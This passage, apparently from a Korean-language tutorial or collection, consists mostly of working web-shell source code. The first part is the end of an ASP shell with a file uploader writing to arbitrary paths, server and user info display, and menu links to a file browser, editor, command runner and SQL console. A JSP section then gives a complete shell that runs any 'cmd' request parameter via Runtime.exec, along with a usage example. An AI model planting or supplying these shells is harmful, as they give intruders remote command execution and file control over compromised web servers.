	Do until (boundaryPos = InstrB(RequestBin, boundary & getByteString("--")))
		'Members variable of objects are put in a dictionary object
		Set UploadControl = CreateObject("Scripting.Dictionary")
		'Get an object name
		Pos = InstrB(BoundaryPos, RequestBin, getByteString("Content-Disposition"))
		Pos = InstrB(Pos, RequestBin, getByteString("name="))
		PosBeg = Pos + 6
		PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(34)))
		Name = getString(MidB(RequestBin, PosBeg, PosEnd-PosBeg))
		PosFile = InstrB(BoundaryPos, RequestBin, getByteString("filename="))
		PosBound = InstrB(PosEnd, RequestBin, boundary)
		'Test if object is of file type
		If PosFile <> 0 AND PosFile < PosBound Then
			'Get Filename, content-type and content of file
			PosBeg = PosFile + 10
			PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(34)))
			FileName = getString(MidB(RequestBin, PosBeg, PosEnd-PosBeg))
			'Add filename to dictionary object
			UploadControl.Add "FileName", FileName
			Pos = InstrB(PosEnd, RequestBin, getByteString("Content-Type:"))
			PosBeg = Pos + 14
			PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(13)))
			'Add content-type to dictionary object
			ContentType = getString(MidB(RequestBin, PosBeg, PosEnd - PosBeg))
			UploadControl.Add "ContentType", ContentType
			'Get content of object
			PosBeg = PosEnd + 4
			PosEnd = InstrB(PosBeg, RequestBin, boundary) - 2
			Value = MidB(RequestBin, PosBeg, PosEnd-PosBeg)
		Else
			'Get content of object
			Pos = InstrB(Pos, RequestBin, getByteString(chr(13)))
			PosBeg = Pos + 4
			PosEnd = InstrB(PosBeg, RequestBin, boundary) - 2
			Value = getString(MidB(RequestBin, PosBeg, PosEnd - PosBeg))
		End If
		UploadControl.Add "Value" , Value
		UploadRequest.Add name, UploadControl
		BoundaryPos = InstrB(BoundaryPos + LenB(boundary), RequestBin, boundary)
	Loop
End Function
Function getByteString(StringStr)
     For i = 1 to Len(StringStr)
          char = Mid(StringStr, i, 1)
          getByteString = getByteString & chrB(AscB(char))
     Next
End Function
Function getString(StringBin)
     getString = ""
     For i = 1 to LenB(StringBin)
          getString = getString & chr(AscB(MidB(StringBin, i, 1)))
     Next
End Function
If request.querystring("upload") = "ok" then 
	dim byteCount, RequestBin, UploadRequest, filepathname, path, f
	byteCount = Request.TotalBytes
	RequestBin = Request.BinaryRead(byteCount)
	Set UploadRequest = CreateObject("Scripting.Dictionary")
	BuildUpload(RequestBin)
	If UploadRequest.Item("file").Item("Value") <> "" Then
		contentType = UploadRequest.Item("file").Item("ContentType")
		filepathname = UploadRequest.Item("file").Item("FileName")
		filename = Right(filepathname,Len(filepathname)-InstrRev(filepathname,"\"))
		value = UploadRequest.Item("file").Item("Value")
		path = UploadRequest.Item("path").Item("Value")
		filename = path & filename
		Set f = fso.CreateTextFile(filename)
		For i = 1 to LenB(value)
			f.Write chr(AscB(MidB(value, i , 1)))
		Next
		f.Close
		Set f = Nothing
	End If
	Set UploadRequest = Nothing
End If
sub upload_form()
	%>
	<form action="?act=fuploader&upload=ok" method="POST" enctype="multipart/form-data">
		<input type="text" name="path" size="60" value="<% = this_path() %>" />
		<input type="file" name="file" />
		<input type="submit" name="upload" Value=" >>" />
	</form>
	<%
end sub
sub ServerInfo()
	%>
	<table> 
		<tr>
			<th><% OsInfo() %></th>
			<th>Server: <% echo Request.ServerVariables("SERVER_SOFTWARE") %></th>
		</tr>
		<tr>
			<th>Computer: <% echo wnet.ComputerName %></th>
			<th>Domain: <% echo wnet.UserDomain %></th>
			<th>User: <% echo wnet.UserName %></th>
			<th>IP: <% echo request.ServerVariables("LOCAL_ADDR") %></th>
		</tr>
	</table>
	<%
end sub
sub OsInfo() 
	dim SystemSet, System
	Set SystemSet = GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
	
	for each System in SystemSet 
		echo System.Caption & " " & System.Version
	next 
	set SystemSet = nothing
end sub 
function Colors(part)
	dim css 
	
	if style = "dark" then 
		css = array("#ddefff", "#181818", "#ddefff", "#83c5ff", "#202020")
	else 
		css = array("#181818", "#f0f8ff", "#015fb2", "#00437e", "#ddefff")
	end if 
	
	if part = "body" or part = "table" or part = "tr" or part = "th" or part = "td" then 
		colors = "color:" & css(0) & "; background-color:" & css(1) & "; "
	elseif part = "input" then 
		if style = "dark" then colors = "color:" & css(1) & "; background-color:" & css(0) & "; border:1px solid " & css(3) & "; "
		if style = "light" then colors = "color:" & css(4) & "; background-color:#242424 ; border:1px solid " & css(2) & "; " 
	elseif part = "hover" then 
		colors = "color:" & css(0) & "; background-color:" & css(4) & "; "
	else 
		colors = css 
	end if
end function
class AspShell
	
	public sub Access() 
		Login() 
	end sub 
	
	public sub Download()
		if action() = "download" then Downloader(trim(S_GET("file"))) 
	end sub 
	
	public sub Header() 
		ServerInfo()
	end sub
	
	public sub Remote() 
		'' todo '' 
	end sub
	
	public sub Body(action) 
		if action = "fbrowser" then
			FileBrowser(this_path)
		elseif action = "feditor" then
			fpath = this_path()
			if trim(S_GET("file")) <> "" then fpath = trim(S_GET("file"))
			FileEditor(fpath)
		elseif action = "fuploader" then
			upload_form()
		elseif action = "cmd" then
			RunCmd()
		elseif action = "sql" then
			Database()
		elseif action = "exit" then
			Logout()
		end if
	end sub
	
end class 
%>
<% set shell = new AspShell %>
<% shell.remote() %>
<% shell.access() %>
<% shell.download() %>
<html>
<head>
	<title>Shell</title>
	<style>
		body { <% echo colors("body") %> text-align:left; padding:2px; font-size:12px; }
		table { <% echo colors("table") %> border-collapse:collapse; width:100%; padding:2px; font-size:12px; }
		th { font-size:13px; text-align:left; padding:2px; }
		td { font-size:12px; text-align:left; padding:2px; }
		table.fbrowser tr { <% echo colors("tr") %> }
		table.fbrowser tr:hover { <% echo colors("hover") %> } 
		.sql { border:1px solid <% echo colors("css")(0) %>; <% echo colors("table") %> width:100%; padding:2px; font-size:12px;}
		.sql th { <% echo colors("th") %>  border:1px solid <% echo colors("css")(0) %>;}
		.sql td { font-size:12px; text-align:left; padding:2px; } 
		.sql tr { <% echo colors("tr") %> }
		.sql tr:hover { <% echo colors("hover") %> }
		input { border:1px solid <% echo colors("css")(0) %>; font-size:12px; padding:2px; <% echo colors("input") %> }
		textarea { width:100%; height:100%; }
		div { padding:2px; }
		.sep { padding:0px; }
		a:link { color:<% echo colors("css")(2) %>; }
		a:visited { color:<% echo colors("css")(3) %>; }
		.menu { text-align:left; padding:2px; font-size:13px; }
		.menu a { color:<% echo colors("css")(0) %>; text-decoration:none; }
	</style>
</head>
<body>
<div>
	<% shell.header() %>
</div>
<div>
	<hr>
	<table class="menu"> 
		<tr>
			<th><a href="<% = this_url %>?act=fbrowser">FileBrowser</a></th>
			<th><a href="<% = this_url %>?act=feditor">FileEditor</a></th>
			<th><a href="<% = this_url %>?act=fuploader">FileUploader</a></th>
			<th><a href="<% = this_url %>?act=cmd">RunCmd</a></th>
			<th><a href="<% = this_url %>?act=sql">SqlQueries</a></th>
			<th><a href="<% = this_url %>?act=exit">Exit</a></th>
		</tr>
	</table>
	<hr>
</div>
<div>
	<% shell.body(action())%>
</div>
</body>
</html>
<% set shell = nothing %>
<% set fso = nothing %>
<% set wshell = nothing %>
<% set wnet = nothing %>
```

## 3. JSP  

테스트 환경은 다음과 같다.  
* Ubuntu 20.04
* Apache Tomcat 9

### WebShell  
```jsp
<%@ page import="java.util.*,java.io.*"%>

<HTML>
  <BODY>
    <FORM METHOD="GET" NAME="myform" ACTION="">
      <INPUT TYPE="text" NAME="cmd">
      <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
    </pre>
  </BODY>
</HTML>

// Usage : http://example.com?filename.jsp?cmd=ls
```